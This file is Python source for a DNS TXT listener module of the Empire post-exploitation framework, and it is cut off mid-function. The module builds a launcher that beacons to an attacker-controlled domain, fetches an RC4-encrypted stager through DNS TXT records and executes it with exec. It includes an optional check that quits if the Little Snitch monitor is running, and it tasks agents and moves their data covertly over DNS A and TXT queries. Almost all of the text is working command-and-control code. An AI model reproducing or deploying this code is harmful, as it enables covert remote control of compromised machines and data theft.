# set up list of semi-random hostnames (from Fierce list?)
# A and TXT record requests for some subset are significant, corresponding to stages of the handshake process
# others can be used for tasking (need to encode nonce in order to avoid caching
# use this to create main event loop
# don't forget the importance of the source port
import logging
# turn off those irritating IPv6 warning messages
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import sys
import binascii
import random
import string
import base64
import os
import time
import copy
import hashlib
import zlib
from pydispatch import dispatcher
from scapy.all import DNS, DNSQR, DNSRR
from socket import AF_INET, SOCK_DGRAM, socket

# Empire imports
from lib.common import helpers
from lib.common import agents
from lib.common import encryption
from lib.common import packets
from lib.common import messages

class Listener:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'DNS TXT',

            'Author': ['drshellface'],

            'Description': ('Starts a DNS TXT listener (Python)'),

            'Category' : ('client_server'),

            'Comments': []
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}

            'Name' : {
                'Description'   :   'Name for the listener.',
                'Required'      :   True,
                'Value'         :   'dnstxt'
            },
            'DefaultProfile' : {
                'Description'   :   'Default communication profile for the agent. List of DNS names the agent can use',
                'Required'      :   True,
                'Value'         :   "www.,www2.,marketing.,cdn.,beta.,uat."
            },
            'Host' : {
                'Description'   :   'Hostname/IP for staging. This is the IP address of the DNS server',
                'Required'      :   True,
                'Value'         :   '208.67.220.220'
            },
            'BindIP' : {
                'Description'   :   'The IP to bind to on the control server.',
                'Required'      :   True,
                'Value'         :   '0.0.0.0'
            },
            'Port' : {
                'Description'   :   'Port for the listener.',
                'Required'      :   True,
                'Value'         :   53
            },
            'FakeDomain' : {
                'Description'   :   'Fake domain (typically your attacked controlled domain) for the launcher to query.',
                'Required'      :   True,
                'Value'         :   'arclightdefence.com'
            },
            'StageOneHostname' : {
                'Description'   :   'Hostname for triggering Stage One: preparing to send stager to launcher',
                'Required'      :   True,
                'Value'         :   'mail'
            },
            'StageTwoHostname' : {
                'Description'   :   'Hostname for triggering Stage Two: sending stager to launcher',
                'Required'      :   True,
                'Value'         :   'router'
            },
            'StageThreeHostname' : {
                'Description'   :   'Hostname for triggering Stage Three: send client DH key to listener',
                'Required'      :   True,
                'Value'         :   'ftp'
            },
            'StageFourHostname' : {
                'Description'   :   'Hostname for triggering Stage Four: send server key + nonce to stager',
                'Required'      :   True,
                'Value'         :   'gw'
            },
            'StageFiveHostname' : {
                'Description'   :   'Hostname for triggering Stage Five: send encrypted nonce + sysinfo to listener',
                'Required'      :   True,
                'Value'         :   'server'
            },
            'StageSixHostname' : {
                'Description'   :   'Hostname for triggering Stage Six: sending agent to stager',
                'Required'      :   True,
                'Value'         :   'pc'
            },
            'NS1Hostname' : {
                'Description'   :   'Hostname for NS1 record',
                'Required'      :   True,
                'Value'         :   'phoenix'
            },
            'IPNS1' : {
                'Description'   :   'IP address for NS1',
                'Required'      :   True,
                'Value'         :   '52.56.80.157'
            },
            'NS2Hostname' : {
                'Description'   :   'Hostname for NS2 record',
                'Required'      :   True,
                'Value'         :   'minotaur'
            },
            'IPNS2' : {
                'Description'   :   'IP address for NS2',
                'Required'      :   True,
                'Value'         :   '81.174.172.4'
            },
            'TaskingHostname' : {
                'Description'   :   'Hostname for agent tasking received via A records',
                'Required'      :   True,
                'Value'         :   'proxy'
            },
            'TaskingTXTHostname' : {
                'Description'   :   'Hostname for agent tasking transferred via TXT records',
                'Required'      :   True,
                'Value'         :   's'
            },
            'TXTStopTransfer' : {
                'Description'   :   'Hostname for indicating the end of a TXT data transfer',
                'Required'      :   True,
                'Value'         :   'lp'
            },
            'AStopTransfer' : {
                'Description'   :   'Hostname for indicating the end of an A data transfer',
                'Required'      :   True,
                'Value'         :   'mailhost'
            },
            'IPSwitchAtoTXT' : {
                'Description'   :   'IP address which signifies that the stager/agent should switch from sending A record requests to TXT requests',
                'Required'      :   True,
                'Value'         :   '192.168.42.3'
            },
            'IPStagetoLauncher' : {
                'Description'   :   'IP address which signifies that the launcher should receive the stager',
                'Required'      :   True,
                'Value'         :   '192.168.42.4'
            },
            'IPEOF' : {
                'Description'   :   'IP address which signifies the EOF of a data transfer',
                'Required'      :   True,
                'Value'         :   '192.168.42.5'
            },
            'IPNOP' : {
                'Description'   :   'IP address which signifies no task are available for the agent',
                'Required'      :   True,
                'Value'         :   '192.168.42.6'
            },
            'IPACK' : {
                'Description'   :   'IP address which is used to ACK a request from the stager',
                'Required'      :   True,
                'Value'         :   '192.168.42.7'
            },
            'TxnID' : {
                'Description'   :   'Transaction ID for the lister to beacon back with.',
                'Required'      :   True,
                'Value'         :   '743e'
            },
            'StagingKey' : {
                'Description'   :   'Staging key for initial agent negotiation.',
                'Required'      :   True,
                'Value'         :   '2c103f2c4ed1e59c0b4e2e01821770fa'
            },
            'DefaultDelay' : {
                'Description'   :   'Agent delay/reach back interval (in seconds).',
                'Required'      :   True,
                'Value'         :   5
            },
            'DefaultJitter' : {
                'Description'   :   'Jitter in agent reachback interval (0.0-1.0).',
                'Required'      :   True,
                'Value'         :   0.0
            },
            'DefaultLostLimit' : {
                'Description'   :   'Number of missed checkins before exiting',
                'Required'      :   True,
                'Value'         :   60
            },
            'KillDate' : {
                'Description'   :   'Date for the listener to exit (MM/dd/yyyy).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WorkingHours' : {
                'Description'   :   'Hours for the agent to operate (09:00-17:00).',
                'Required'      :   False,
                'Value'         :   ''
            },
        }

        # required:
        self.mainMenu = mainMenu
        self.threads = {}

        # set the default staging key to the controller db default
        self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])

    def validate_options(self):
        """
        Validate all options for this listener.
        """

        for key in self.options:
            if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
                print helpers.color("[!] Option \"%s\" is required." % (key))
                return False

        return True


    def generate_launcher(self, encode=False, userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='false', listenerName=None):
        """
        Generate a basic launcher for the specified listener.
        """

        if not language:
            print helpers.color('[!] listeners/dns generate_launcher(): no language specified!')

        if listenerName and (listenerName in self.threads) and (listenerName in self.mainMenu.listeners.activeListeners):

            # extract the set options for this instantiated listener
            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]['options']
            host = listenerOptions['Host']['Value']
            port = listenerOptions['Port']['Value']
            txn_id = listenerOptions['TxnID']['Value']
            fake_domain = listenerOptions['FakeDomain']['Value']
            stagingKey = listenerOptions['StagingKey']['Value']
            ipstagetolauncher = listenerOptions['IPStagetoLauncher']['Value']
            stageonehostname = listenerOptions['StageOneHostname']['Value']
            stagetwohostname = listenerOptions['StageTwoHostname']['Value']
            
            if language.startswith('py'):
                # Python
                launcherBase = 'import sys;'
                launcherBase += 'import socket;'
                launcherBase += 'import binascii;'
                launcherBase += 'import struct;'
                launcherBase += 'import zlib;'
                launcherBase += 'import hashlib;'
                
                try:
                    if safeChecks.lower() == 'true':
                        launcherBase += "import re, subprocess;"
                        launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
                        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n"
                        launcherBase += "out = ps.stdout.read()\n"
                        launcherBase += "ps.stdout.close()\n"
                        launcherBase += "if re.search(\"Little Snitch\", out):\n"
                        launcherBase += "   sys.exit()\n"
                except Exception as e:
                    p = "[!] Error setting LittleSnitch in stager: " + str(e)
                    print helpers.color(p, color='red')
                launcherBase += "server='{}';".format(host)
                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
                b32RoutingPacket = base64.b32encode(routingPacket)

                # create faux DNS beacon and receive response
                launcherBase += "port='{}';".format(port)
                launcherBase += "fake_domain='{}';".format(fake_domain)
                launcherBase += "txn_id='{}';".format(txn_id)
                launcherBase += "stagetwohostname='{}';".format(stagetwohostname)
                launcherBase += "ipstagetolauncher='{}';".format(ipstagetolauncher)
                launcherBase += "\n"
                launcherBase += "def pack_hostname(fqdn):\n"
                launcherBase += "    bytes_txt_host = bytearray()\n"
                launcherBase += "    for label in fqdn.split('.'):\n"
                launcherBase += "        tmp = bytearray()\n"
                launcherBase += "        format_str='{}s'.format(len(label))\n"
                launcherBase += "        tmp=struct.pack(format_str,label)\n"
                launcherBase += "        lab_len=struct.pack('B',len(label))\n"
                launcherBase += "        bytes_txt_host+=lab_len+(bytes(tmp))\n"
                launcherBase += "    bytes_txt_host += struct.pack('x')\n"
                launcherBase += "    return(bytes_txt_host)\n"

                launcherBase += "c_sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)\n"
                launcherBase += "dst=(server,int(port))\n"
                launcherBase += "a_record_hostname=pack_hostname('{}.{}.{}')\n".format(stageonehostname,b32RoutingPacket,fake_domain)
                launcherBase += "a_record = bytearray(struct.pack('>H', int(txn_id,16))+struct.pack('BBBBBBBBBB',1,0,0,1,0,0,0,0,0,0)+a_record_hostname+struct.pack('BBBB',0,1,0,1))\n"
                launcherBase += "c_sock.sendto(a_record,dst)\n"
                launcherBase += "a,server=c_sock.recvfrom(256)\n"
                # TODO check the ipaddr is the same as stagetolauncher
                launcherBase += "print 'recv sync {}'.format(struct.unpack('>H',a[:2])[0])\n"
                launcherBase += "txn_int = int(txn_id,16)\n"
                launcherBase += "recv_txn_int = struct.unpack('>H',a[:2])[0]\n"
                launcherBase += "if txn_int != recv_txn_int:\n"
                launcherBase += "    print 'recvd DNS pkt with wrong txn_id'\n"
                launcherBase += "txn_int += 1\n"
                launcherBase += "agent_base64 = []\n"
                launcherBase += "agent_tmp = ''\n"

                launcherBase += "counter = 0\n"
                launcherBase += "while True:\n"
                launcherBase += "    try:\n"
                launcherBase += "        hostname = '{}.{}'.format(counter, fake_domain)\n"
                launcherBase += "        hostname = stagetwohostname + hostname\n"
                launcherBase += "        txn_int_bytes = struct.pack('>H', txn_int)\n"
                launcherBase += "        txt_record = bytearray(txn_int_bytes)\n"
                launcherBase += "        dns_flags = txt_record + bytearray(struct.pack('BBBBBBBBBB',1,0,0,1,0,0,0,0,0,0))\n"
                launcherBase += "        bytes_txt_host=pack_hostname(hostname)\n"
                launcherBase += "        txt_record2 = dns_flags + bytes_txt_host\n"
                launcherBase += "        txt_request = txt_record2 + bytearray(struct.pack('BBBB',0,16,0,1))\n"
                launcherBase += "        c_sock.sendto(txt_request,dst)\n"
                launcherBase += "        c_sock.settimeout(5)\n"
                launcherBase += "        agent_tmp,server=c_sock.recvfrom(512)\n"
                launcherBase += "        print 'recv ID from launcher {}'.format(struct.unpack('>H',agent_tmp[:2])[0])\n"
                launcherBase += "        if txn_int != struct.unpack('>H',agent_tmp[:2])[0]:"
                launcherBase += "            print 'counter mismatch'\n"
                launcherBase += "        txn_int += 1\n"
                launcherBase += "        if binascii.hexlify(agent_tmp)[7] == '3':\n"
                launcherBase += "            break\n"
                launcherBase += "        offset = 31 + len(hostname)\n"
                #launcherBase += "        print 'offset {}'.format(offset)\n"
                launcherBase += "        agent_base64.append(agent_tmp[offset:])\n"
                #launcherBase += "        print(agent_tmp[offset:])\n"
                launcherBase += "        counter += 1\n"
                launcherBase += "    except socket.timeout:\n"
                launcherBase += "        pass\n"
                launcherBase += "ba = bytearray()\n"
                launcherBase += "print 'length of label array: {}'.format(len(agent_base64))\n"
                launcherBase += "for ele in agent_base64:\n"
                launcherBase += "    ba.extend(binascii.a2b_base64(ele))\n"
                launcherBase += "print 'length {}'.format(len(ba))\n"
                launcherBase += "m = hashlib.sha256(ba)\n"
                launcherBase += "print m.hexdigest()\n"
                launcherBase += "a=str(ba)\n"

                # download the stager and extract the IV
                launcherBase += "IV=a[0:4];"
                launcherBase += "data=a[4:];"
                launcherBase += "key=IV+'%s';\n" % (stagingKey)

                # RC4 decryption
                launcherBase += "S,j,out=range(256),0,[]\n"
                launcherBase += "for i in range(256):\n"
                launcherBase += "    j=(j+S[i]+ord(key[i%len(key)]))%256\n"
                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                launcherBase += "i=j=0\n"
                launcherBase += "for char in data:\n"
                launcherBase += "    i=(i+1)%256\n"
                launcherBase += "    j=(j+S[i])%256\n"
                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                launcherBase += "    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))\n"
                launcherBase += "stager=(''.join(out))\n"
                launcherBase += "exec(zlib.decompress(stager))"
                
                if encode:
                    launchEncoded = base64.b64encode(launcherBase)
                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" % (launchEncoded)
                    return launcher
                else:
                    return launcherBase

            else:
                print helpers.color("[!] listeners/dns generate_launcher(): invalid language specification: only 'powershell' and 'python' are currently supported for this module.")

        else:
            print helpers.color("[!] listeners/dns generate_launcher(): invalid listener name specification!")


    def generate_stager(self, listenerOptions, encode=False, encrypt=True, language=None):
        """
        Generate the stager code needed for communications with this listener.
        """

        if not language:
            print helpers.color('[!] listeners/dns generate_stager(): no language specified!')
            return None

        stagingKey = listenerOptions['StagingKey']['Value']
        host = listenerOptions['Host']['Value']
        port = listenerOptions['Port']['Value']
        fake_domain = listenerOptions['FakeDomain']['Value']
        stagethreehostname = listenerOptions['StageThreeHostname']['Value']
        stagefourhostname = listenerOptions['StageFourHostname']['Value']
        stagefivehostname = listenerOptions['StageFiveHostname']['Value']
        stagesixhostname = listenerOptions['StageSixHostname']['Value']
        taskinghostname = listenerOptions['TaskingHostname']['Value']
        taskingtxthostname = listenerOptions['TaskingTXTHostname']['Value']
        
        if language.lower() == 'python':
            # read in the stager base
            f = open("%s/data/agent/stagers/dns.py" % (self.mainMenu.installPath))
            stager = f.read()
            f.close()

            stager = helpers.strip_python_comments(stager)

            if host.endswith("/"):
                host = host[0:-1]

            # patch the server and key information
            stager = stager.replace("REPLACE_STAGING_KEY", stagingKey)
            stager = stager.replace("REPLACE_HOSTNAME", host)
            stager = stager.replace("REPLACE_PORT", str(port))
            stager = stager.replace("REPLACE_DOMAINNAME", fake_domain)
            stager = stager.replace("REPLACE_STAGETHREEHOSTNAME", stagethreehostname)
            stager = stager.replace("REPLACE_STAGEFOURHOSTNAME", stagefourhostname)
            stager = stager.replace("REPLACE_STAGEFIVEHOSTNAME", stagefivehostname)
            stager = stager.replace("REPLACE_STAGESIXHOSTNAME", stagesixhostname)
            stager = stager.replace("REPLACE_TASKINGHOSTNAME", taskinghostname)
            stager = stager.replace("REPLACE_TASKINGTXTHOSTNAME", taskingtxthostname)

            stager = zlib.compress(stager,9)
            # base64 encode the stager and return it
            if encode:
                return base64.b64encode(stager)
            if encrypt:
                # return an encrypted version of the stager ("normal" staging)
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(RC4IV+stagingKey, stager)
            else:
                # otherwise return the standard stager
                return stager

        else:
            print helpers.color("[!] listeners/dns generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")


    def generate_agent(self, listenerOptions, language=None):
        """
        Generate the full agent code needed for communications with this listener.
        """

        if not language:
            print helpers.color('[!] listeners/dns generate_agent(): no language specified!')
            return None

        language = language.lower()
        delay = listenerOptions['DefaultDelay']['Value']
        jitter = listenerOptions['DefaultJitter']['Value']
        lostLimit = listenerOptions['DefaultLostLimit']['Value']
        killDate = listenerOptions['KillDate']['Value']
        workingHours = listenerOptions['WorkingHours']['Value']
        b64DefaultResponse = base64.b64encode(self.default_response())

        if language == 'python':
            f = open(self.mainMenu.installPath + "./data/agent/agent.py")
            code = f.read()
            f.close()

            # patch in the comms methods
            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
            code = code.replace('REPLACE_COMMS', commsCode)

            # strip out comments and blank lines
            code = helpers.strip_python_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace('delay = 60', 'delay = %s' % (delay))
            code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
            code = code.replace('lostLimit = 60', 'lostLimit = %s' % (lostLimit))
            code = code.replace('defaultResponse = base64.b64decode("")', 'defaultResponse = base64.b64decode("%s")' % (b64DefaultResponse))

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
            if workingHours != "":
                code = code.replace('workingHours = ""', 'workingHours = "%s"' % (killDate))

            return code
        else:
            print helpers.color("[!] listeners/dns generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")


    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.

        This is so agents can easily be dynamically updated for the new listener.
        """

        if language:
            if language.lower() == 'python':
                updatePort = "port = '%s'\n"  % (listenerOptions['Port']['Value'])                
                updateServers = "server = '%s'\n"  % (listenerOptions['Host']['Value'])
                updateIPNOP = "ipnop = '%s'\n"  % (listenerOptions['IPNOP']['Value'])
                updateIPSwitchAtoTXT = "ipswitchatotxt = '%s'\n"  % (listenerOptions['IPSwitchAtoTXT']['Value'])
                sendMessage = """
def send_message(packets=None):
    # Requests a tasking or posts data to a randomized tasking URI.
    # If packets == None, the agent GETs a tasking from the control server.
    # If packets != None, the agent encrypts the passed packets and
    #    POSTs the data to the control server.

    global missedCheckins
    global server
    global host
    global headers
    global taskURIs
    global sock
    global fake_domain
    global taskinghostname
    global taskingtxthostname

    iprecv = ""
    data = None
    print "[AGENT] in send_message()"

    if packets:
        data = ''.join(packets)
        # aes_encrypt_then_hmac is in stager.py
        encData = aes_encrypt_then_hmac(key, data)
        data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
        ip_recv=send_data_to_listener(taskinghostname, sock, host, port, data, fake_domain)
    else:
        # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
        #   meta TASKING_REQUEST = 4
        routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
        ip_recv=send_data_to_listener(taskinghostname, sock, host, port, routingPacket, fake_domain)
    try:
        print "[AGENT] main control loop"
        if ip_recv == ipnop:
            print "standard NOP response"
        elif ip_recv == ipswitchatotxt:
            # A record
            print "recv A record response, switching to sending TXT request in order to recv agent command"
            a=recv_data_from_listener(taskingtxthostname, sock, fake_domain, host, port)
            return ('200', a)

    except Exception as e:
        print e
    return ('', '')
"""
                return updateServers + updatePort + updateIPNOP + updateIPSwitchAtoTXT + sendMessage

            else:
                print helpers.color("[!] listeners/dns generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
        else:
            print helpers.color('[!] listeners/dns generate_comms(): no language specified!')

    def default_response(self):
        print "default response"
        return "default response"

    def send_ns_response(self, fake_domain, reply_hostname, reply_ipaddr, reply_addr_tuple, sock, reply_id, reply_qd):
        reply = DNS(
            id=reply_id, qr=1, ancount=1, qdcount=1, arcount=1,
            qd=reply_qd,
            an=DNSRR(rrname=fake_domain, type='NS', rdata=reply_hostname+'.'+fake_domain, ttl=300),
            ar=DNSRR(rrname=str(reply_hostname), type='A', rdata=reply_ipaddr, ttl=300))    
        sock.sendto(bytes(reply), reply_addr_tuple)

    def send_a_record_reply(self, sock, reply_hostname, reply_ipaddr, reply_addr_tuple):
        reply = DNS(
            ancount=1, qr=1,
            an=DNSRR(rrname=str(reply_hostname), type='A', rdata=reply_ipaddr, ttl=300))
        sock.sendto(bytes(reply), reply_addr_tuple)

    def send_a_record_reply_id(self, sock, reply_hostname, reply_ipaddr, reply_addr_tuple, reply_id, reply_qd):
        reply = DNS(
            id=reply_id,ancount=1, qr=1,
            qd=reply_qd,
            an=DNSRR(rrname=str(reply_hostname), type='A', rdata=reply_ipaddr, ttl=300))
        sock.sendto(bytes(reply), reply_addr_tuple)

    def send_txt_record_reply_id(self, sock, reply_hostname, reply_ipaddr, reply_addr_tuple, reply_id, reply_qd):
        print "send_txt_record_reply host: {}".format(reply_hostname)
        reply = DNS(
            id=reply_id,ancount=1, qr=1,
            qd=reply_qd,
            an=DNSRR(rrname=str(reply_hostname), type='TXT', rdata=''.join(random.choice(string.uppercase) for i in range(225)), ttl=300))
        sock.sendto(bytes(reply), reply_addr_tuple)
        txt_request, txt_addr = sock.recvfrom(512)
        txt_dns = DNS(txt_request)
        return txt_dns[DNSQR].qname, txt_addr, txt_dns.id, txt_dns.qd

    def send_txt_record_reply_id_test(self, sock, reply_hostname, reply_ipaddr, reply_addr_tuple, reply_id, reply_qd):
        print "send_txt_record_reply host: {}".format(reply_hostname)
        reply = DNS(
            id=reply_id,ancount=1, qr=1,
            qd=reply_qd,
            an=DNSRR(rrname=str(reply_hostname), type='TXT', rdata=''.join(random.choice(string.uppercase) for i in range(225)), ttl=300))
        sock.sendto(bytes(reply), reply_addr_tuple)
    
    def is_eof_response(self, dns):
        if str(dns[DNSQR].qname).startswith("smtp"):
            return True
        else:
            return False
        
    def recv_data_via_a_record(self, sock, recv_hostname, ipack, addr, fake_domain, ipeof):
        a_base32 = ""
        while True:
            data,server_dns=sock.recvfrom(512)
            a_dns = DNS(data)
            if self.is_eof_response(a_dns):
                self.send_a_record_reply_id(sock, recv_hostname, ipeof, server_dns, a_dns.id, a_dns.qd)
                break
            self.send_a_record_reply_id(sock, recv_hostname, ipack, server_dns, a_dns.id, a_dns.qd)
            a_host = a_dns[DNSQR].qname.decode('ascii')
            a_host = a_host.replace('.' + fake_domain, "")
            a_array = a_host.split('.')
            # remove prefix + suffix
            del a_array[0]
            del a_array[-1:]
            if len(a_array) == 1:
                a_base32 = a_base32+a_array[0]
            elif len(a_array) == 2:
                a_base32 = a_base32+a_array[0]+a_array[1]
        print a_base32
        a_decode=base64.b32decode(a_base32)

        return a_decode
    
    def process_tasking_txt(self, hostname, sock, payload, addr, ipack, txtstoptransfer, reply_id, reply_qd):
        self.send_txt_record_reply_id(sock, hostname, ipack, addr)
        txt_request, txt_addr = sock.recvfrom(512)

        self.send_payload_via_txt(hostname, sock, payload, txt_addr, txtstoptransfer, reply_id, reply_qd)
        
    def stop_data_transfer(self, sock, host, port, txtstoptransfer, hostname, reply_id):
        #sock.sendto(bytes("EOF"),(host, int(port)))
        print "STOPPING DATA TRANSFER"
        txt_snd = DNS(id=reply_id,qr=1,ancount=0,rd=1,ra=1,qdcount=1,rcode="name-error", qd=DNSRR(rrname=str(hostname), type='TXT', rdata="", ttl=300))
        sock.sendto(bytes(txt_snd),(host,int(port)))
                
    def send_payload_via_txt(self, hostname, sock, payload, addr, txtstoptransfer, reply_id, reply_qd):
        counter = 0

        s2_reply_id = reply_id
        s2_reply_qd = reply_qd
        s2_addr = addr
        
        # max length of TXT record after headers 
        n = 168
        m = hashlib.sha256(payload)
        print m.hexdigest()
        
        print "send_payload_via_txt - sending response {} with payload len {} to tuple {} with initial counter ID {}".format(hostname, len(payload), addr, counter)
        for bytes_to_encode in [payload[i:i+n] for i in range(0, len(payload), n)]:
            ascii_to_send = binascii.b2a_base64(bytes_to_encode)
            #print "send_payload_via_txt - sending {}".format(ascii_to_send)
            print "{}".format(ascii_to_send)

            txt_snd = DNS(
                id=s2_reply_id, ancount=1, qr=1,
                qd=s2_reply_qd,
                an=DNSRR(rrname=str(hostname), type='TXT', rdata=ascii_to_send, ttl=300))

            #time.sleep(random.randint(0,1))

            try:
                recv_counter = int(filter(str.isdigit, hostname))
            except ValueError as e:
                recv_counter = 0
                
            print "send_payload_via_txt - hostname {} counter {} recv_counter {}".format(hostname, counter, recv_counter)
            if recv_counter != counter:
                print "incorrect hostname recvd!"
            else:
                sock.sendto(bytes(txt_snd), s2_addr)
            txt_request, txt_addr = sock.recvfrom(512)
            txt_dns = DNS(txt_request)
            s2_reply_id = txt_dns.id
            s2_reply_qd = txt_dns.qd
            s2_addr = txt_addr
            hostname = str(txt_dns[DNSQR].qname)
            counter += 1
            
        self.stop_data_transfer(sock, s2_addr[0], s2_addr[1], txtstoptransfer, hostname, s2_reply_id)
        print "send_payload_via_txt - number of labels to send: {}".format(len(payload) / n)


    def send_payload_via_txt_test(self, sock, payload, txtstoptransfer):
        file_array = []
        
        # max length of TXT record after headers 
        n = 168

        payload_counter = 0
        for bytes_to_encode in [payload[i:i+n] for i in range(0, len(payload), n)]:
            ascii_to_send = binascii.b2a_base64(bytes_to_encode)
            file_array.append(ascii_to_send)
            payload_counter += 1

        print "generated array of length {}".format(len(file_array))
            
        while True:
            txt_request, txt_addr = sock.recvfrom(512)
            print "recv pkt from {} {}".format(txt_addr[0], txt_addr[1])
            txt_dns = DNS(txt_request)
            s2_reply_id = txt_dns.id
            s2_reply_qd = txt_dns.qd
            hostname = str(txt_dns[DNSQR].qname)
            recv_counter = int(filter(str.isdigit, hostname))    

            if recv_counter > len(file_array)-1:
                self.stop_data_transfer(sock, txt_addr[0], txt_addr[1], txtstoptransfer, hostname, s2_reply_id)
                break
            else:
                txt_snd = DNS(
                    id=s2_reply_id, ancount=1, qr=1,
                    qd=s2_reply_qd,
                    an=DNSRR(rrname=str(hostname), type='TXT', rdata=file_array[recv_counter], ttl=300))

                print "send_payload_via_txt - sending segment {} to hostname {}".format(recv_counter, hostname)
                sock.sendto(bytes(txt_snd), txt_addr)
        
    # Stage 1
    def trigger_staging(self, sock, recv_hostname, ipstagetolauncher, addr, reply_id, reply_qd):
        # extract second label from hostname
        b32RoutingPacket = recv_hostname.split('.')[1]
        try:
            routingPacket = base64.b32decode(b32RoutingPacket)
            self.send_a_record_reply_id(sock, recv_hostname, ipstagetolauncher, addr, reply_id, reply_qd)
            return routingPacket
        except Exception as e:
            print e

    # Stage 3 and 5
    def process_a_records(self, sock, stagingKey, listenerOptions, recv_hostname, ipack, addr, fake_domain, astoptransfer, ipeof, reply_id, reply_qd):
        self.send_a_record_reply_id(sock, recv_hostname, ipack, addr, reply_id, reply_qd)
        data=self.recv_data_via_a_record(sock, recv_hostname, ipack, addr, fake_domain, ipeof)
        return data

    # Agent requests tasking information
    def process_tasking_a(self, sock, stagingKey, listenerOptions, recv_hostname, ipack, ipnop, ipswitchatotxt, addr, fake_domain, astoptransfer, reply_id, reply_qd):
        self.send_a_record_reply_id(sock, recv_hostname, ipack, addr, reply_id, reply_qd)

        a_base32 = ""
        while True:
            data,server_dns=sock.recvfrom(512)
            a_dns = DNS(data)
            if self.is_eof_response(a_dns):
                print "[PROCESS] BREAKING"
                break
            a_host = a_dns[DNSQR].qname.decode('ascii')
            a_host = a_host.replace('.' + fake_domain, "")
            a_array = a_host.split('.')
            # remove prefix + suffix
            del a_array[0]
            del a_array[-1:]
            print "a_array len {}".format(len(a_array))
            if len(a_array) == 1:
                a_base32 = a_base32+a_array[0]
            elif len(a_array) == 2:
                print "concat a_array 0 {} + a_array 1 {}".format(a_array[0], a_array[1])
                a_base32 = a_base32 + a_array[0] + a_array[1]
            self.send_a_record_reply_id(sock, a_host, ipack, server_dns, a_dns.id, a_dns.qd)
        print "About to decode {}".format(a_base32)
        routingPacket = base64.b32decode(a_base32)
        dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, routingPacket, listenerOptions, addr[0])
        if dataResults and len(dataResults) > 0:
            for (language, results) in dataResults:
                if results:        
                    self.send_a_record_reply(sock, a_host, ipswitchatotxt, addr)
                    return results
                else:
                    self.send_a_record_reply(sock, a_host, ipnop, addr)
                    return None
                            
    # Stage 2
    def send_stager_to_launcher(self, sock, hostname, addr, stagingKey, routingPacket, listenerOptions, txtstoptransfer, reply_id, reply_qd):
        dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, routingPacket, listenerOptions, addr[0])
        if dataResults and len(dataResults) > 0:
            for (language, results) in dataResults:
                if results:
                    if results == 'STAGE0':
                        dispatcher.send("[*] Sending %s stager (stage 1) to %s" % (language, addr[0]), sender='listeners/dns')
                        # Generate stager to send to launcher
                        stage = self.generate_stager(language=language, listenerOptions=listenerOptions)
                        # TODO fix response code
                        print helpers.color('[!] listeners/dns send_stager_to_launcher(): got stager with length {} and response code {}'.format(len(stage),200))
                        self.send_payload_via_txt(hostname, sock, stage, addr, txtstoptransfer, reply_id, reply_qd)
                    elif results.startswith('ERROR:'):
                        #dispatcher.send("[!] Error from agents.handle_agent_data() for %s from %s: %s" % (request_uri, clientIP, results), sender='listeners/dns')
                                        
                        if 'not in cache' in results:
                            # signal the client to restage
                            print helpers.color("[*] Orphaned agent from %s, signaling restaging" % (addr[0]))
                            return self.send_payload_via_txt(hostname, sock, stage, addr, txtstoptransfer, reply_id, reply_qd)
                        else:
                            return self.send_payload_via_txt(hostname, sock, stage, addr, txtstoptransfer, reply_id, reply_qd)
    # Stage 4
    def send_crypto_to_stager(self, hostname, sock, stagingKey, listenerOptions, routingPacket, addr, ipack, txtstoptransfer, reply_id, reply_qd):
        m = hashlib.sha256(routingPacket)
        print "SHA256 of routingPacket {}".format(m.hexdigest())
        self.send_txt_record_reply_id_test(sock, hostname, ipack, addr, reply_id, reply_qd)
        dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, routingPacket, listenerOptions, addr[0])
        if dataResults and len(dataResults) > 0:
            for (language, results) in dataResults:
                if results:
                    if not results.startswith('STAGE0') or not results.startswith('STAGE2') or not results.startswith('ERROR'):
                        print "send_crypto_to_stager - About to send to {} with payload len {}".format(hostname, len(results))
                        self.send_payload_via_txt_test(sock, results, txtstoptransfer)

    # Stage 6
    def send_agent_to_stager(self, hostname, stagingKey, sock, stager_crypto, listenerOptions, addr, ipack, txtstoptransfer, reply_id, reply_qd):
        self.send_txt_record_reply_id_test(sock, hostname, ipack, addr, reply_id, reply_qd)
        
        dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, stager_crypto, listenerOptions, addr[0])
        if dataResults and len(dataResults) > 0:
            for (language, results) in dataResults:
                if results:
                    if results.startswith('STAGE2'):
                        print "STAGE2 recv, staging agent"
                        # TODO: document the exact results structure returned
                        sessionID = results.split(' ')[1].strip()
                        sessionKey = self.mainMenu.agents.agents[sessionID]['sessionKey']
